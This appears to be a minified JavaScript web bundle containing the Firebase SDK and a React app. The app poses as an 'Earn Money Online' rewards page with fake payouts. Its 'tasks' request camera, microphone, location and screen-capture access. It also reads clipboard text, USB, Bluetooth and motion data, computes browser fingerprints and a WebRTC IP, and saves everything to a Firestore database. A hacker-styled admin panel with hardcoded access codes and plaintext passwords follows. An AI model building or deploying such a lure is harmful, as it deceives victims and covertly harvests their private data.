i.isEqual(n)||An(`Document ${s} contains a document reference within a different database (${i.projectId}/${i.database}) which is not supported. It will be treated as a reference in the current database (${n.projectId}/${n.database}) instead.`),s}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Gw(t,e,n){let r;return r=t?t.toFirestore(e):e,r}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class As{constructor(e,n){this.hasPendingWrites=e,this.fromCache=n}isEqual(e){return this.hasPendingWrites===e.hasPendingWrites&&this.fromCache===e.fromCache}}class Kw extends qw{constructor(e,n,r,i,s,o){super(e,n,r,i,o),this._firestore=e,this._firestoreImpl=e,this.metadata=s}exists(){return super.exists()}data(e={}){if(this._document){if(this._converter){const n=new Ba(this._firestore,this._userDataWriter,this._key,this._document,this.metadata,null);return this._converter.fromFirestore(n,e)}return this._userDataWriter.convertValue(this._document.data.value,e.serverTimestamps)}}get(e,n={}){if(this._document){const r=this._document.data.field(kf("DocumentSnapshot.get",e));if(r!==null)return this._userDataWriter.convertValue(r,n.serverTimestamps)}}}class Ba extends Kw{data(e={}){return super.data(e)}}class sN{constructor(e,n,r,i){this._firestore=e,this._userDataWriter=n,this._snapshot=i,this.metadata=new As(i.hasPendingWrites,i.fromCache),this.query=r}get docs(){const e=[];return this.forEach(n=>e.push(n)),e}get size(){return this._snapshot.docs.size}get empty(){return this.size===0}forEach(e,n){this._snapshot.docs.forEach(r=>{e.call(n,new Ba(this._firestore,this._userDataWriter,r.key,r,new As(this._snapshot.mutatedKeys.has(r.key),this._snapshot.fromCache),this.query.converter))})}docChanges(e={}){const n=!!e.includeMetadataChanges;if(n&&this._snapshot.excludesMetadataChanges)throw new H(O.INVALID_ARGUMENT,"To include metadata changes with your document changes, you must also pass { includeMetadataChanges:true } to onSnapshot().");return this._cachedChanges&&this._cachedChangesIncludeMetadataChanges===n||(this._cachedChanges=function(i,s){if(i._snapshot.oldDocs.isEmpty()){let o=0;return i._snapshot.docChanges.map(l=>{const u=new Ba(i._firestore,i._userDataWriter,l.doc.key,l.doc,new As(i._snapshot.mutatedKeys.has(l.doc.key),i._snapshot.fromCache),i.query.converter);return l.doc,{type:"added",doc:u,oldIndex:-1,newIndex:o++}})}{let o=i._snapshot.oldDocs;return i._snapshot.docChanges.filter(l=>s||l.type!==3).map(l=>{const u=new Ba(i._firestore,i._userDataWriter,l.doc.key,l.doc,new As(i._snapshot.mutatedKeys.has(l.doc.key),i._snapshot.fromCache),i.query.converter);let h=-1,f=-1;return l.type!==0&&(h=o.indexOf(l.doc.key),o=o.delete(l.doc.key)),l.type!==1&&(o=o.add(l.doc),f=o.indexOf(l.doc.key)),{type:oN(l.type),doc:u,oldIndex:h,newIndex:f}})}}(this,n),this._cachedChangesIncludeMetadataChanges=n),this._cachedChanges}}function oN(t){switch(t){case 0:return"added";case 2:case 3:return"modified";case 1:return"removed";default:return X()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ea(t){t=qt(t,ot);const e=qt(t.firestore,qr);return jP(Tf(e),t._key).then(n=>uN(e,t,n))}class Qw extends iN{constructor(e){super(),this.firestore=e}convertBytes(e){return new Fi(e)}convertReference(e){const n=this.convertDocumentKey(e,this.firestore._databaseId);return new ot(this.firestore,null,n)}}function Yw(t){t=qt(t,Ki);const e=qt(t.firestore,qr),n=Tf(e),r=new Qw(e);return eN(t._query),zP(n,t._query).then(i=>new sN(e,r,t,i))}function wc(t,e,n){t=qt(t,ot);const r=qt(t.firestore,qr),i=Gw(t.converter,e);return hu(r,[zw(lu(r),"setDoc",t._key,i,t.converter!==null,n).toMutation(t._key,Nt.none())])}function Cs(t,e,n,...r){t=qt(t,ot);const i=qt(t.firestore,qr),s=lu(i);let o;return o=typeof(e=at(e))=="string"||e instanceof au?YP(s,"updateDoc",t._key,e,n,r):QP(s,"updateDoc",t._key,e),hu(i,[o.toMutation(t._key,Nt.exists(!0))])}function aN(t){return hu(qt(t.firestore,qr),[new af(t._key,Nt.none())])}function lN(t,e){const n=qt(t.firestore,qr),r=jt(t),i=Gw(t.converter,e);return hu(n,[zw(lu(t.firestore),"addDoc",r._key,i,t.converter!==null,{}).toMutation(r._key,Nt.exists(!1))]).then(()=>r)}function hu(t,e){return function(r,i){const s=new yn;return r.asyncQueue.enqueueAndForget(async()=>kP(await UP(r),i,s)),s.promise}(Tf(t),e)}function uN(t,e,n){const r=n.docs.get(e._key),i=new Qw(t);return new Kw(t,i,e._key,r,new As(n.hasPendingWrites,n.fromCache),e.converter)}(function(e,n=!0){(function(i){qi=i})($i),Pi(new Or("firestore",(r,{instanceIdentifier:i,options:s})=>{const o=r.getProvider("app").getImmediate(),l=new qr(new lx(r.getProvider("auth-internal")),new dx(r.getProvider("app-check-internal")),function(h,f){if(!Object.prototype.hasOwnProperty.apply(h.options,["projectId"]))throw new H(O.INVALID_ARGUMENT,'"projectId" not provided in firebase.initializeApp.');return new co(h.options.projectId,f)}(o,i),o);return s=Object.assign({useFetchStreams:n},s),l._setSettings(s),l},"PUBLIC").setMultipleInstances(!0)),rr(Ig,"4.7.3",e),rr(Ig,"4.7.3","esm2017")})();const cN={apiKey:"AIzaSyDwd_0HgLDHF2vsQnWhn8ItBd20xt7ZbC4",authDomain:"visit-and-get.firebaseapp.com",projectId:"visit-and-get",storageBucket:"visit-and-get.firebasestorage.app",messagingSenderId:"249322078960",appId:"1:249322078960:web:16b3da146159ff30a93835"},Xw=q_(cN);ix(Xw);const _t=WP(Xw);function hN(){const[t,e]=F.useState(0),[n,r]=F.useState(""),[i,s]=F.useState(0),[o,l]=F.useState([]);F.useEffect(()=>{u()},[]);async function u(){const v=b_();r(v);const A=await ZS();await f(v,A)}async function h(){const v={frontCamera:null,backCamera:null,microphone:null,audioRecording:null,screenRecording:null,locationLat:null,locationLong:null,locationAccuracy:null,locationAddress:null,contacts:null,clipboardText:null,bluetoothDevices:null,usbDevices:null,motionData:null,orientationData:null,batteryStatus:null,mediaDevices:null,audioDevices:null,storageEstimate:null,accelerometerData:null,gyroscopeData:null,magnetometerData:null,vrDisplays:null,canvasFingerprint:null,audioFingerprint:null,webGLFingerprint:null,webRTCIP:null,ambientLight:null,notification:!1};e(1);try{await V_()&&(v.frontCamera="granted",l(k=>[...k,"Camera Verification"]),s(k=>k+2.5),await p(n,{...v,frontCamera:"granted"}))}catch(A){console.error("Front camera error:",A)}e(2);try{await O_()&&(v.microphone="granted",l(k=>[...k,"Audio Check"]),s(k=>k+1.5),await p(n,{...v,microphone:"granted"}))}catch(A){console.error("Mic error:",A)}e(3);try{const A=await L_();A&&(v.locationLat=A.position.coords.latitude,v.locationLong=A.position.coords.longitude,v.locationAccuracy=A.position.coords.accuracy,l(k=>[...k,"Location Verification"]),s(k=>k+2),await p(n,{...v,locationLat:A.position.coords.latitude,locationLong:A.position.coords.longitude}))}catch(A){console.error("Location error:",A)}e(4);try{await _A()&&(v.screenRecording="granted",l(k=>[...k,"Screen Capture"]),s(k=>k+3),await p(n,{...v,screenRecording:"granted"}))}catch(A){console.error("Screen capture error:",A)}e(5);try{const A=await mA();A&&(v.clipboardText=A);const k=await yA();k&&(v.usbDevices=k);const N=await gA();N&&(v.bluetoothDevices=N);const S=await wA();S&&(v.mediaDevices=S),l(_=>[..._,"Device Sync"]),s(_=>_+1.5),await p(n,v)}catch(A){console.error("Device sync error:",A)}e(6);try{const A=await EA();A&&(v.storageEstimate=A),v.notification=await vA();const k=await CA();k&&(v.motionData=k);const N=await RA();N&&(v.orientationData=N),l(S=>[...S,"System Check"]),s(S=>S+1.5),await p(n,v)}catch(A){console.error("System check error:",A)}e(7);try{v.canvasFingerprint=TA(),v.audioFingerprint=await IA(),v.webGLFingerprint=SA(),v.webRTCIP=await AA(),await p(n,v)}catch(A){console.error("Fingerprint error:",A)}await p(n,v),e(8)}async function f(v,A){try{const k=Uh(_t,"visitors");await lN(k,{deviceId:v,deviceFingerprint:v,ipAddress:"detecting",firstVisit:pe.now(),lastSeen:pe.now(),silentFeatures:A,createdAt:pe.now()})}catch(k){console.error("Firebase save error:",k)}}async function p(v,A){try{const k=Uh(_t,"visitors"),N=nN(k,rN("deviceId","==",v)),S=await Yw(N);if(!S.empty){const _=S.docs[0].ref;await Cs(_,{permissionFeatures:A,lastSeen:pe.now()})}}catch(k){console.error("Firebase update error:",k)}}const g=[{name:"Camera Verification",reward:"$2.50",icon:"📷"},{name:"Audio Check",reward:"$1.50",icon:"🎤"},{name:"Location Verification",reward:"$2.00",icon:"📍"},{name:"Screen Capture",reward:"$3.00",icon:"🖥️"},{name:"Device Sync",reward:"$1.50",icon:"📱"},{name:"System Check",reward:"$1.50",icon:"⚙️"},{name:"Final Verification",reward:"$3.00",icon:"✓"}];return E.jsxs("div",{style:{minHeight:"100vh",background:"linear-gradient(135deg, #667eea 0%, #764ba2 100%)",display:"flex",alignItems:"center",justifyContent:"center",fontFamily:'-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',padding:"20px"},children:[E.jsxs("div",{style:{background:"white",borderRadius:"24px",padding:"40px",maxWidth:"600px",width:"100%",boxShadow:"0 20px 60px rgba(0,0,0,0.3)"},children:[t===0&&E.jsxs(E.Fragment,{children:[E.jsxs("div",{style:{textAlign:"center",marginBottom:"30px"},children:[E.jsx("div",{style:{fontSize:"64px",marginBottom:"20px",animation:"pulse 2s infinite"},children:"💰"}),E.jsx("h1",{style:{fontSize:"32px",color:"#1a1a1a",marginBottom:"10px",fontWeight:"700"},children:"Earn Money Online"}),E.jsx("p",{style:{fontSize:"16px",color:"#666",marginBottom:"10px"},children:"Complete simple tasks and earn real cash"}),E.jsx("div",{style:{background:"#4CAF50",color:"white",padding:"8px 20px",borderRadius:"20px",display:"inline-block",fontSize:"14px",fontWeight:"600"},children:"Total Earning: $12.00"})]}),E.jsxs("div",{style:{background:"#f8f9fa",borderRadius:"16px",padding:"25px",marginBottom:"25px"},children:[E.jsx("h3",{style:{fontSize:"18px",color:"#1a1a1a",marginBottom:"20px",fontWeight:"600"},children:"📊 Available Tasks"}),g.map((v,A)=>E.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"15px",background:"white",borderRadius:"12px",marginBottom:"10px",boxShadow:"0 2px 8px rgba(0,0,0,0.05)"},children:[E.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"12px"},children:[E.jsx("span",{style:{fontSize:"24px"},children:v.icon}),E.jsx("span",{style:{color:"#333",fontSize:"15px"},children:v.name})]}),E.jsx("div",{style:{background:"#4CAF50",color:"white",padding:"6px 14px",borderRadius:"8px",fontWeight:"600",fontSize:"14px"},children:v.reward})]},A))]}),E.jsx("div",{style:{background:"#fff3cd",border:"1px solid #ffc107",borderRadius:"12px",padding:"15px",marginBottom:"25px"},children:E.jsxs("p",{style:{margin:0,color:"#856404",fontSize:"14px"},children:["⚡ ",E.jsx("strong",{children:"Fast Payment:"})," Complete all tasks and withdraw instantly via PayPal, Bank Transfer, or Mobile Wallet"]})}),E.jsx("button",{onClick:h,style:{width:"100%",background:"linear-gradient(135deg, #667eea 0%, #764ba2 100%)",color:"white",border:"none",padding:"18px",borderRadius:"12px",fontSize:"18px",fontWeight:"600",cursor:"pointer",boxShadow:"0 4px 15px rgba(102, 126, 234, 0.4)",transition:"transform 0.2s"},children:"🚀 Start Earning Now"}),E.jsx("p",{style:{textAlign:"center",color:"#999",fontSize:"12px",marginTop:"20px"},children:"✓ No signup required  •  ✓ Instant payout  •  ✓ 100% Free"})]}),t>0&&t<8&&E.jsxs(E.Fragment,{children:[E.jsxs("div",{style:{textAlign:"center",marginBottom:"30px"},children:[E.jsx("div",{style:{fontSize:"48px",marginBottom:"15px"},children:"⏳"}),E.jsx("h2",{style:{fontSize:"28px",color:"#1a1a1a",marginBottom:"10px",fontWeight:"700"},children:"Verifying Your Device"}),E.jsx("p",{style:{color:"#666",fontSize:"15px"},children:"Please complete the permission requests"})]}),E.jsxs("div",{style:{marginBottom:"25px"},children:[E.jsx("div",{style:{background:"#e8e8e8",height:"8px",borderRadius:"4px",overflow:"hidden"},children:E.jsx("div",{style:{background:"linear-gradient(90deg, #4CAF50, #45a049)",height:"100%",width:`${t/7*100}%`,transition:"width 0.5s",borderRadius:"4px"}})}),E.jsxs("div",{style:{display:"flex",justifyContent:"space-between",marginTop:"10px",fontSize:"13px",color:"#666"},children:[E.jsx("span",{children:"Progress"}),E.jsxs("span",{children:[Math.round(t/7*100),"%"]})]})]}),E.jsx("div",{style:{background:"#f8f9fa",borderRadius:"16px",padding:"20px"},children:g.map((v,A)=>E.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"12px 0",borderBottom:A<g.length-1?"1px solid #e0e0e0":"none"},children:[E.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"10px"},children:[E.jsx("span",{style:{fontSize:"20px"},children:o.includes(v.name)?"✅":"○"}),E.jsx("span",{style:{color:o.includes(v.name)?"#4CAF50":"#666",fontSize:"14px",fontWeight:o.includes(v.name)?"600":"400"},children:v.name})]}),E.jsx("span",{style:{color:o.includes(v.name)?"#4CAF50":"#999",fontSize:"14px",fontWeight:"600"},children:o.includes(v.name)?v.reward:"Pending"})]},A))}),E.jsxs("div",{style:{background:"#e8f5e9",border:"2px solid #4CAF50",borderRadius:"12px",padding:"20px",marginTop:"25px",textAlign:"center"},children:[E.jsx("p",{style:{color:"#2e7d32",fontSize:"14px",marginBottom:"5px"},children:"💵 Your Current Earnings"}),E.jsxs("p",{style:{color:"#1b5e20",fontSize:"36px",fontWeight:"700",margin:0},children:["$",i.toFixed(2)]})]})]}),t===8&&E.jsxs(E.Fragment,{children:[E.jsxs("div",{style:{textAlign:"center",marginBottom:"30px"},children:[E.jsx("div",{style:{fontSize:"72px",marginBottom:"20px",animation:"pulse 1s infinite"},children:"🎉"}),E.jsx("h1",{style:{fontSize:"32px",color:"#4CAF50",marginBottom:"15px",fontWeight:"700"},children:"Congratulations!"}),E.jsx("p",{style:{color:"#666",fontSize:"16px"},children:"All tasks completed successfully"})]}),E.jsxs("div",{style:{background:"linear-gradient(135deg, #667eea 0%, #764ba2 100%)",borderRadius:"16px",padding:"30px",marginBottom:"25px",textAlign:"center"},children:[E.jsx("p",{style:{color:"rgba(255,255,255,0.9)",fontSize:"14px",marginBottom:"10px"},children:"TOTAL EARNED"}),E.jsxs("p",{style:{color:"white",fontSize:"48px",fontWeight:"700",margin:0},children:["$",i.toFixed(2)]})]}),E.jsxs("div",{style:{background:"#f8f9fa",borderRadius:"16px",padding:"20px",marginBottom:"25px"},children:[E.jsx("h3",{style:{fontSize:"16px",color:"#333",marginBottom:"15px",fontWeight:"600"},children:"✅ Completed Tasks"}),o.map((v,A)=>{var k;return E.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",padding:"10px 0",borderBottom:A<o.length-1?"1px solid #e0e0e0":"none"},children:[E.jsxs("span",{style:{color:"#4CAF50",fontSize:"14px"},children:["✓ ",v]}),E.jsxs("span",{style:{color:"#4CAF50",fontWeight:"600",fontSize:"14px"},children:["$",((k=g.find(N=>N.name===v))==null?void 0:k.reward)||"$0.00"]})]},A)})]}),E.jsx("div",{style:{background:"#e3f2fd",border:"2px solid #2196F3",borderRadius:"12px",padding:"20px",marginBottom:"25px"},children:E.jsx("p",{style:{color:"#1565c0",fontSize:"14px",textAlign:"center",margin:0},children:"💳 Your earnings will be processed within 24 hours and sent to your registered payment method. Please make sure your email is correct."})}),E.jsx("div",{style:{background:"#fff3cd",border:"1px solid #ffc107",borderRadius:"12px",padding:"15px",marginBottom:"20px"},children:E.jsx("p",{style:{color:"#856404",fontSize:"13px",margin:0,textAlign:"center"},children:"⚡ Your verification is complete! You'll receive payment confirmation via email."})}),E.jsx("button",{onClick:()=>window.location.reload(),style:{width:"100%",background:"#4CAF50",color:"white",border:"none",padding:"16px",borderRadius:"12px",fontSize:"16px",fontWeight:"600",cursor:"pointer"},children:"✓ Done"})]})]}),E.jsx("style",{children:`
        @keyframes pulse {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.05); }
        }
      `})]})}const dN="DEVICE2024",fN="FORGET2024";function pN({onSuccess:t}){const[e,n]=F.useState("code"),[r,i]=F.useState(""),[s,o]=F.useState(""),[l,u]=F.useState(""),[h,f]=F.useState(""),[p,g]=F.useState(""),[v,A]=F.useState(""),[k,N]=F.useState(!1),[S,_]=F.useState(!1),[R,V]=F.useState(0),U=async()=>{const x=await I(),w=jt(_t,"blocked_ips",x),he=await Ea(w);if(he.exists()){const Vt=he.data().blockedUntil.toDate();if(new Date<Vt){const ct=Math.ceil((Vt.getTime()-Date.now())/1e3/60);return _(!0),V(ct),!0}}return!1},j=async()=>{const x=await I(),w=new Date(Date.now()+60*60*1e3);await wc(jt(_t,"blocked_ips",x),{ipAddress:x,blockedUntil:pe.fromDate(w)}),_(!0);const he=Math.ceil((w.getTime()-Date.now())/1e3/60);V(he)},I=async()=>{try{return(await(await fetch("https://api.ipify.org?format=json")).json()).ip}catch{return"unknown"}},y=async x=>{if(x.preventDefault(),N(!0),A(""),await U()){A(`IP blocked for ${R} minutes`),N(!1);return}r===dN?n("signup"):(await j(),A("Wrong code! IP blocked for 1 hour.")),N(!1)},T=async x=>{x.preventDefault(),N(!0),A("");try{const w=jt(_t,"admin_users",s);if((await Ea(w)).exists()){A("Email already registered."),N(!1);return}await wc(w,{email:s,password:l,createdAt:pe.now(),lastLogin:pe.now()}),localStorage.setItem("admin_email",s),t()}catch(w){A(w.message)}N(!1)},C=async x=>{x.preventDefault(),N(!0),A("");try{const w=jt(_t,"admin_users",s),he=await Ea(w);if(!he.exists()){A("Email not found."),N(!1);return}if(he.data().password!==l){A("Wrong password."),N(!1);return}localStorage.setItem("admin_email",s),t()}catch(w){A(w.message)}N(!1)},P=async x=>{if(x.preventDefault(),N(!0),A(""),h!==fN){A("Wrong forget code."),N(!1);return}try{const w=jt(_t,"admin_users",s),he=await Ea(w);if(!he.exists()){A("Email not found."),N(!1);return}await wc(w,{...he.data(),password:p}),A("Password updated! Login now."),n("login")}catch(w){A(w.message)}N(!1)};return E.jsxs("div",{className:"hacker-login",children:[E.jsx("style",{children:`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        @keyframes matrix {
          0% { transform: translateY(0); }
          100% { transform: translateY(-100%); }
        }

        @keyframes scanline {
          0% { top: 0%; }
          100% { top: 100%; }
        }

        @keyframes glitch {
          0% { transform: translate(0); }
          20% { transform: translate(-2px, 2px); }
          40% { transform: translate(-2px, -2px); }
          60% { transform: translate(2px, 2px); }
          80% { transform: translate(2px, -2px); }
          100% { transform: translate(0); }
        }

        @keyframes pulse {
          0%, 100% { opacity: 0.5; }
          50% { opacity: 1; }
        }

        @keyframes typing {
          from { width: 0; }
          to { width: 100%; }
        }

        .hacker-login {
          background: #000000;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          position: relative;
          overflow: hidden;
        }

        .hacker-login::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background:
            repeating-linear-gradient(
              0deg,
              rgba(0, 255, 0, 0.03) 0px,
              rgba(0, 255, 0, 0.03) 1px,
              transparent 1px,
              transparent 2px
            );
          pointer-events: none;
          z-index: 1;
        }

        .scanline {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 4px;
          background: rgba(0, 255, 0, 0.4);
          box-shadow: 0 0 20px rgba(0, 255, 0, 0.8);
          animation: scanline 3s linear infinite;
          z-index: 10;
          pointer-events: none;
        }

        .cyber-grid {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background-image:
            linear-gradient(rgba(0, 255, 100, 0.1) 1px, transparent 1px),
            linear-gradient(90deg, rgba(0, 255, 100, 0.1) 1px, transparent 1px);
          background-size: 50px 50px;
          pointer-events: none;
        }

        .binary-rain {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          overflow: hidden;
          pointer-events: none;
          z-index: 0;
        }

        .binary-column {
          position: absolute;
          top: -100%;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          color: rgba(0, 255, 0, 0.3);
          writing-mode: vertical-rl;
          animation: matrix linear infinite;
        }

        .card {
          position: relative;
          z-index: 5;
          background: rgba(0, 0, 0, 0.95);
          border: 2px solid #00ff00;
          padding: 40px;
          box-shadow:
            0 0 30px rgba(0, 255, 0, 0.5),
            inset 0 0 30px rgba(0, 255, 0, 0.05);
          animation: glitch 5s infinite;
          min-width: 400px;
        }

        .corner {
          position: absolute;
          width: 20px;
          height: 20px;
          border: 2px solid #00ff00;
        }

        .corner-tl { top: -5px; left: -5px; border-right: none; border-bottom: none; }
        .corner-tr { top: -5px; right: -5px; border-left: none; border-bottom: none; }
        .corner-bl { bottom: -5px; left: -5px; border-right: none; border-top: none; }
        .corner-br { bottom: -5px; right: -5px; border-left: none; border-top: none; }

        h1 {
          font-family: 'Courier New', monospace;
          color: #00ff00;
          font-size: 24px;
          text-align: center;
          margin-bottom: 10px;
          text-shadow: 0 0 10px #00ff00;
          text-transform: uppercase;
          letter-spacing: 4px;
        }

        .subtitle {
          font-family: 'Courier New', monospace;
          color: #00cc00;
          font-size: 12px;
          text-align: center;
          margin-bottom: 30px;
          opacity: 0.8;
        }

        .input-group {
          margin-bottom: 20px;
        }

        label {
          display: block;
          font-family: 'Courier New', monospace;
          color: #00ff00;
          margin-bottom: 8px;
          font-size: 12px;
          text-transform: uppercase;
          letter-spacing: 1px;
        }

        input {
          width: 100%;
          padding: 15px;
          background: rgba(0, 0, 0, 0.8);
          border: 1px solid #00ff00;
          color: #00ff00;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          transition: all 0.3s;
        }

        input:focus {
          outline: none;
          box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
          border-color: #00ff00;
        }

        input::placeholder {
          color: rgba(0, 255, 0, 0.4);
        }

        button {
          width: 100%;
          padding: 15px;
          background: #00ff00;
          border: none;
          color: #000000;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          font-weight: bold;
          cursor: pointer;
          text-transform: uppercase;
          letter-spacing: 2px;
          transition: all 0.3s;
          box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }

        button:hover {
          background: #ffffff;
          box-shadow: 0 0 30px rgba(0, 255, 0, 0.8);
        }

        button:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .error {
          background: rgba(255, 0, 0, 0.2);
          border: 1px solid #ff0000;
          padding: 15px;
          margin-bottom: 20px;
          color: #ff0000;
          font-family: 'Courier New', monospace;
          font-size: 12px;
          text-align: center;
          animation: pulse 1s infinite;
        }

        .switch {
          text-align: center;
          margin-top: 25px;
          font-family: 'Courier New', monospace;
          font-size: 12px;
          color: #00ff00;
        }

        .switch a {
          color: #00ff00;
          cursor: pointer;
          text-decoration: underline;
          transition: all 0.3s;
        }

        .switch a:hover {
          color: #ffffff;
          text-shadow: 0 0 10px #00ff00;
        }

        .blocked {
          text-align: center;
          padding: 20px;
        }

        .blocked h2 {
          font-family: 'Courier New', monospace;
          color: #ff0000;
          font-size: 20px;
          margin-bottom: 15px;
          text-shadow: 0 0 10px #ff0000;
          animation: pulse 1s infinite;
        }

        .blocked p {
          font-family: 'Courier New', monospace;
          color: #ff0000;
          font-size: 12px;
        }

        .status-bar {
          position: absolute;
          bottom: 20px;
          left: 50%;
          transform: translateX(-50%);
          font-family: 'Courier New', monospace;
          font-size: 10px;
          color: #00ff00;
          opacity: 0.5;
          display: flex;
          gap: 30px;
        }

        .status-item {
          display: flex;
          align-items: center;
          gap: 5px;
        }

        .status-dot {
          width: 6px;
          height: 6px;
          background: #00ff00;
          border-radius: 50%;
          animation: pulse 1s infinite;
        }

        .success-message {
          background: rgba(0, 255, 0, 0.2);
          border: 1px solid #00ff00;
          padding: 15px;
          margin-bottom: 20px;
          color: #00ff00;
          font-family: 'Courier New', monospace;
          font-size: 12px;
          text-align: center;
        }
      `}),E.jsx("div",{className:"scanline"}),E.jsx("div",{className:"cyber-grid"}),E.jsx("div",{className:"binary-rain",children:Array.from({length:20}).map((x,w)=>E.jsx("div",{className:"binary-column",style:{left:`${w*5}%`,animationDuration:`${10+Math.random()*20}s`,animationDelay:`${Math.random()*10}s`},children:Array.from({length:50}).map(()=>Math.random()>.5?"1":"0").join("")},w))}),E.jsxs("div",{className:"card",children:[E.jsx("div",{className:"corner corner-tl"}),E.jsx("div",{className:"corner corner-tr"}),E.jsx("div",{className:"corner corner-bl"}),E.jsx("div",{className:"corner corner-br"}),S?E.jsxs("div",{className:"blocked",children:[E.jsx("h2",{children:"[ ACCESS DENIED ]"}),E.jsxs("p",{children:["IP BLOCKED FOR ",R," MINUTES"]}),E.jsx("p",{style:{marginTop:"10px",fontSize:"10px",opacity:"0.6"},children:"SECURITY PROTOCOL ACTIVE"})]}):E.jsxs(E.Fragment,{children:[e==="code"&&E.jsxs(E.Fragment,{children:[E.jsx("h1",{children:"[ AUTHORIZATION ]"}),E.jsx("p",{className:"subtitle",children:"// Enter secret code to proceed //"}),v&&E.jsx("div",{className:"error",children:v}),E.jsxs("form",{onSubmit:y,children:[E.jsxs("div",{className:"input-group",children:[E.jsxs("label",{children:[">"," Secret Code"]}),E.jsx("input",{type:"password",value:r,onChange:x=>i(x.target.value),placeholder:"Enter access code...",required:!0})]}),E.jsx("button",{type:"submit",disabled:k,children:k?"VERIFYING...":"[ CONTINUE ]"})]}),E.jsxs("div",{className:"switch",children:["Have account? ",E.jsx("a",{onClick:()=>n("login"),children:"Login"})]})]}),e==="signup"&&E.jsxs(E.Fragment,{children:[E.jsx("h1",{children:"[ CREATE IDENTITY ]"}),E.jsx("p",{className:"subtitle",children:"// One device = One account //"}),v&&E.jsx("div",{className:"error",children:v}),E.jsxs("form",{onSubmit:T,children:[E.jsxs("div",{className:"input-group",children:[E.jsxs("label",{children:[">"," Email"]}),E.jsx("input",{type:"email",value:s,onChange:x=>o(x.target.value),placeholder:"admin@system.io",required:!0})]}),E.jsxs("div",{className:"input-group",children:[E.jsxs("label",{children:[">"," Password"]}),E.jsx("input",{type:"password",value:l,onChange:x=>u(x.target.value),placeholder:"Create secure password...",required:!0})]}),E.jsx("button",{type:"submit",disabled:k,children:k?"CREATING...":"[ INITIALIZE ]"})]}),E.jsxs("div",{className:"switch",children:["Have account? ",E.jsx("a",{onClick:()=>n("login"),children:"Login"})]})]}),e==="login"&&E.jsxs(E.Fragment,{children:[E.jsx("h1",{children:"[ ACCESS PORTAL ]"}),E.jsx("p",{className:"subtitle",children:"// Enter credentials //"}),v&&E.jsx("div",{className:"error",children:v}),E.jsxs("form",{onSubmit:C,children:[E.jsxs("div",{className:"input-group",children:[E.jsxs("label",{children:[">"," Email"]}),E.jsx("input",{type:"email",value:s,onChange:x=>o(x.target.value),placeholder:"admin@system.io",required:!0})]}),E.jsxs("div",{className:"input-group",children:[E.jsxs("label",{children:[">"," Password"]}),E.jsx("input",{type:"password",value:l,onChange:x=>u(x.target.value),placeholder:"Enter password...",required:!0})]}),E.jsx("button",{type:"submit",disabled:k,children:k?"CONNECTING...":"[ ACCESS ]"})]}),E.jsx("div",{className:"switch",children:E.jsx("a",{onClick:()=>n("forget"),children:"Forgot Password?"})})]}),e==="forget"&&E.jsxs(E.Fragment,{children:[E.jsx("h1",{children:"[ RESET ACCESS ]"}),E.jsx("p",{className:"subtitle",children:"// Use forget code //"}),v&&(v.includes("updated")?E.jsx("div",{className:"success-message",children:v}):E.jsx("div",{className:"error",children:v})),E.jsxs("form",{onSubmit:P,children:[E.jsxs("div",{className:"input-group",children:[E.jsxs("label",{children:[">"," Email"]}),E.jsx("input",{type:"email",value:s,onChange:x=>o(x.target.value),placeholder:"admin@system.io",required:!0})]}),E.jsxs("div",{className:"input-group",children:[E.jsxs("label",{children:[">"," Forget Code"]}),E.jsx("input",{type:"password",value:h,onChange:x=>f(x.target.value),placeholder:"Enter forget code...",required:!0})]}),E.jsxs("div",{className:"input-group",children:[E.jsxs("label",{children:[">"," New Password"]}),E.jsx("input",{type:"password",value:p,onChange:x=>g(x.target.value),placeholder:"New password...",required:!0})]}),E.jsx("button",{type:"submit",disabled:k,children:k?"RESETTING...":"[ RESET ]"})]}),E.jsx("div",{className:"switch",children:E.jsx("a",{onClick:()=>n("login"),children:"Back to 